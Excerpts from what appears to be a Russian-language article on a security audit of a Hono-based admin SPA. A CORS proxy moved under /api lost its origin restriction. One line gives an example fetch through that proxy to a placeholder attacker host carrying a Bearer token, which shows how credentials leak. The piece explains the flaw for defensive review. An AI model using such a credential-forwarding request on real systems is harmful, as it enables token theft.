...
Двадцать строк на Hono. Что тут может пойти не так.

Ответ дал аудит безопасности админ-SPA для управления контентом (2026-06-11).
...
- **Кража учётных данных.** `fetch('https://admin.example/api/cors/attacker.tld/x',
  {headers: {Authorization: 'Bearer ' + token}})` — воркер послушно доставляет
...
Вот что особенно неприятно: у отдельного воркера, который этот код заменил, фиксация
...
но смонтированного на /api». Считайте перенос переписыванием и дайте ему тот же
ревью, что прошёл оригинал.
...
ошибки на вашей стороне, и именно эта тишина делает весь класс таким опасным.
